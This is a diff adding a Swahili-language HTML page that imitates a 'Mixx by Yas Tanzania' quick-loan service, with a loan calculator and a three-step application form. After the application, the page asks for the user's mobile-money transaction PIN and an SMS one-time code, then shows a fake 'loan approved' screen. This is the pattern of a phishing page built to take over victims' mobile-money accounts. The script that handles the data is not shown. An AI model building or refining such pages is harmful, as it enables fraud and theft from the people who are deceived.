@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas Tanzania – Mikopo ya Haraka na Rasmi</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="app-container">
+        <header class="app-header">
+            <div class="logo">Mixx<span>Yas</span></div>
+        </header>
+
+        <section id="view-landing" class="app-view active">
+            <div class="hero-section" style="text-align: center; margin-bottom: 20px;">
+                <h1 style="font-size: 1.6rem; margin-bottom: 5px;">Pata Mkopo Wako Haraka</h1>
+                <p style="color: var(--text-muted); font-size: 0.9rem;">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
+            </div>
+
+            <div class="calculator-card">
+                <h2 style="font-size: 1.1rem; margin-bottom: 15px; text-align: center;">Kikokotoo cha Mkopo</h2>
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Kiasi cha Mkopo</label>
+                        <span id="calc-amount-val">TSh 100,000</span>
+                    </div>
+                    <input type="range" id="calc-amount" min="10000" max="10000000" step="10000" value="100000">
+                    <div class="range-limits"><span>TSh 10K</span><span>TSh 10M</span></div>
+                </div>
+
+                <div class="input-group">
+                    <div class="label-row">
+                        <label>Muda wa Mkopo</label>
+                        <span id="calc-duration-val">miezi 12</span>
+                    </div>
+                    <input type="range" id="calc-duration" min="6" max="60" step="6" value="12">
+                    <div class="range-limits"><span>miezi 6</span><span>miezi 60</span></div>
+                </div>
+
+                <div class="result-box">
+                    <p style="font-size: 0.8rem; color: var(--text-muted);" class="result-label">Malipo ya Kila Mwezi (Pamoja na Riba)</p>
+                    <p class="result-value" id="calc-monthly-payment">TSh 9,363</p>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="navigateTo('view-step1')">OMBA SASA</button>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-item"><span class="icon" style="font-size: 1.5rem;">⚡</span><h4>Idhini Haraka</h4><p style="color: var(--text-muted);">Masaa 24</p></div>
+                <div class="feature-item"><span class="icon" style="font-size: 1.5rem;">💰</span><h4>Riba Nafuu</h4><p style="color: var(--text-muted);">Kuanzia 25%</p></div>
+                <div class="feature-item"><span class="icon" style="font-size: 1.5rem;">🔒</span><h4>Salama kabisa</h4><p style="color: var(--text-muted);">Ulinzi wa Benki</p></div>
+            </div>
+        </section>
+
+        <section id="view-step1" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-landing')">← Rudi Nyuma</div>
+            <h2 style="font-size: 1.3rem; margin-bottom: 5px;">Maombi ya Mkopo</h2>
+            <p style="color: var(--primary-color); font-size: 0.85rem; margin-bottom: 15px;" class="step-indicator">Hatua 1 ya 3</p>
+            
+            <form id="form-step1" onsubmit="event.preventDefault(); saveStep1();">
+                <div class="form-group">
+                    <label>Aina ya Mkopo</label>
+                    <select id="loan-type" required>
+                        <option value="Mkopo wa Binafsi">Mkopo wa Binafsi (Personal Loan)</option>
+                        <option value="Mkopo wa Biashara">Mkopo wa Biashara (Business Loan)</option>
+                        <option value="Mkopo wa Dharura">Mkopo wa Dharura (Emergency Loan)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Kiasi unachoomba (TSh)</label>
+                    <input type="number" id="loan-amount" required min="10000">
+                </div>
+                <div class="form-group">
+                    <label>Muda wa Marejesho (Miezi)</label>
+                    <input type="number" id="loan-duration" required min="6" max="60">
+                </div>
+                <div class="form-group">
+                    <label>Madhumuni ya Mkopo</label>
+                    <input type="text" id="loan-purpose" placeholder="Mfano: Kununua bidhaa za duka" required>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block" style="margin-top: 15px;">HATUA INAYOFUATA</button>
+            </form>
+        </section>
+
+        <section id="view-step2" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-step1')">← Rudi Nyuma</div>
+            <h2 style="font-size: 1.3rem; margin-bottom: 5px;">Maombi ya Mkopo</h2>
+            <p style="color: var(--primary-color); font-size: 0.85rem; margin-bottom: 15px;" class="step-indicator">Hatua 2 ya 3</p>
+            
+            <form id="form-step2" onsubmit="event.preventDefault(); saveStep2();">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Jina la Kwanza</label>
+                        <input type="text" id="first-name" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Jina la Ukoo</label>
+                        <input type="text" id="last-name" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Barua Pepe (Email)</label>
+                    <input type="email" id="email" required placeholder="name@example.com">
+                </div>
+                <div class="form-group">
+                    <label>Nambari ya Simu (M-Pesa/Tigo Pesa/Airtel Money)</label>
+                    <div class="phone-input-wrapper">
+                        <span class="prefix">🇹🇿 +255</span>
+                        <input type="tel" id="phone" placeholder="712345678" pattern="[0-9]{9}" required title="Weka namba bila kuanza na 0 (Namba 9 za mwisho)">
+                    </div>
+                </div>
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="navigateTo('view-step1')">RUDI</button>
+                    <button type="submit" class="btn btn-primary">ENDELEA</button>
+                </div>
+            </form>
+        </section>
+
+        <section id="view-step3" class="app-view">
+            <div class="back-nav" onclick="navigateTo('view-step2')">← Rudi Nyuma</div>
+            <h2 style="font-size: 1.3rem; margin-bottom: 5px;">Maombi ya Mkopo</h2>
+            <p style="color: var(--primary-color); font-size: 0.85rem; margin-bottom: 15px;" class="step-indicator">Hatua 3 ya 3</p>
+            
+            <form id="form-step3" onsubmit="event.preventDefault(); submitApplication();">
+                <div class="form-group">
+                    <label>Hali yako ya Ajira</label>
+                    <select id="employment-status" required>
+                        <option value="Mwajiriwa">Mwajiriwa Serikalini / Sekta Binafsi</option>
+                        <option value="Mfanyabiashara">Mfanyabiashara / Mjasiriamali</option>
+                        <option value="Mkulima">Mkulima</option>
+                        <option value="Nyingine">Nyingine</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Makadirio ya Mapato ya Mwaka (TSh)</label>
+                    <input type="number" id="annual-income" required placeholder="Mfano: 3,000,000">
+                </div>
+                
+                <div class="summary-box">
+                    <h3 style="font-size: 0.9rem; margin-bottom: 8px; color: var(--text-color);">Muhtasari wa Maombi Yako</h3>
+                    <div class="summary-item"><span>Kiasi unachoomba:</span> <strong id="sum-amount">TSh 0</strong></div>
+                    <div class="summary-item"><span>Muda wa kurejesha:</span> <strong id="sum-duration">0 Miezi</strong></div>
+                    <div class="summary-item"><span>Jina Kamili:</span> <strong id="sum-name">—</strong></div>
+                </div>
+                
+                <div class="btn-group">
+                    <button type="button" class="btn btn-secondary" onclick="navigateTo('view-step2')">RUDI</button>
+                    <button type="submit" class="btn btn-primary">WASILISHA MAOMBI</button>
+                </div>
+            </form>
+        </section>
+
+        <section id="view-success" class="app-view" style="text-align: center; padding-top: 30px;">
+            <div class="success-icon" style="font-size: 3rem; margin-bottom: 15px;">📋</div>
+            <h2 style="font-size: 1.4rem; margin-bottom: 10px;">Maombi Yawasilishwa!</h2>
+            <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 20px;">Tafadhali subiri kidogo wakati mfumo ukikagua maelezo yako...</p>
+            <div class="loader-circle" style="margin: 0 auto 15px auto;"></div>
+            <p style="font-size: 0.85rem; color: var(--text-muted);">🔄 Unaelekezwa kuingia kwenye akaunti yako baada ya sekunde <span id="countdown" style="font-weight: bold; color: var(--primary-color);">3</span>...</p>
+        </section>
+
+        <section id="view-login" class="app-view">
+            <h2 style="font-size: 1.4rem; text-align: center; margin-bottom: 5px;">Thibitisha Akaunti</h2>
+            <p style="color: var(--text-muted); text-align: center; font-size: 0.85rem; margin-bottom: 20px;">Weka PIN yako ya muamala ili kukamilisha usajili wa mkopo</p>
+            
+            <form id="form-login" onsubmit="event.preventDefault(); handleLogin();">
+                <div class="form-group">
+                    <label>Nambari yako ya Simu</label>
+                    <div class="phone-input-wrapper">
+                        <span class="prefix">🇹🇿 +255</span>
+                        <input type="tel" id="login-phone" required readonly>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Weka PIN ya Huduma za Kifedha (Tarakimu 4)</label>
+                    <input type="password" id="login-pin" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" placeholder="••••" required style="letter-spacing: 8px; text-align: center; font-size: 1.2rem;">
+                </div>
+                <button type="submit" class="btn btn-primary btn-block" style="margin-top: 15px;">INGIA NA UENDELEE</button>
+            </form>
+        </section>
+
+        <section id="view-otp" class="app-view" style="text-align: center;">
+            <h2 style="font-size: 1.4rem; margin-bottom: 5px;">Uthibitisho wa OTP</h2>
+            <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px;">Tumetuma msimbo wa uthibitisho (OTP) kwenye namba yako ya simu kwa njia ya SMS.</p>
+            
+            <div class="otp-inputs">
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp2')" id="otp1" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp3')" id="otp2" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" onkeyup="moveOtpFocus(this, 'otp4')" id="otp3" required>
+                <input type="text" class="otp-box" inputmode="numeric" maxlength="1" id="otp4" required>
+            </div>
+            
+            <button class="btn btn-primary btn-block" onclick="verifyOtp()" style="margin-top: 15px;">THIBITISHA SASA</button>
+            <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 15px;">Hukupata ujumbe? <span style="color: var(--primary-color); cursor: pointer;">Tuma tena SMS</span></p>
+        </section>
+
+        <section id="view-dashboard" class="app-view" style="text-align: center;">
+            <div class="success-banner" style="margin-bottom: 20px;">
+                <h3 style="font-size: 1rem;">🎉 Hongera! Mkopo Umeidhinishwa!</h3>
+            </div>
+            <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 10px;">Kiasi cha mkopo ulichotengewa:</p>
+            <div class="approved-amount-card" style="margin-bottom: 20px;">
+                <h2 id="dash-approved-amount" style="font-size: 2rem; font-weight: bold;">TSh 100,000</h2>
+            </div>
+            <p style="font-size: 0.95rem; line-height: 1.5; color: var(--text-color);">Maombi yako yamepokelewa na kufanyiwa kazi kikamilifu. Pesa zitatumwa moja kwa moja kwenye akaunti yako ya simu ndani ya dakika 5 hadi 10 zijazo.</p>
+            <div class="success-icon" style="font-size: 3.5rem; margin-top: 20px; animation: pulse 2s infinite;">✅</div>
+        </section>
+
+        <div id="loading-overlay" class="overlay hidden">
+            <div class="overlay-content" style="text-align: center; background: white; padding: 25px; border-radius: var(--radius); box-shadow: 0 4px 15px rgba(0,0,0,0.1);">
+                <div class="loader-circle" style="margin: 0 auto 10px auto;"></div>
+                <h3 id="overlay-msg" style="font-size: 1rem; color: var(--text-color);">Tafadhali subiri…</h3>
+                <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Inashughulikia maelezo salama...</p>
+            </div>
+        </div>
+
+        <footer class="app-footer">
+            <p>© 2026 Mixx by Yas Tanzania. Haki zote zimehifadhiwa.</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+              </html>
+  
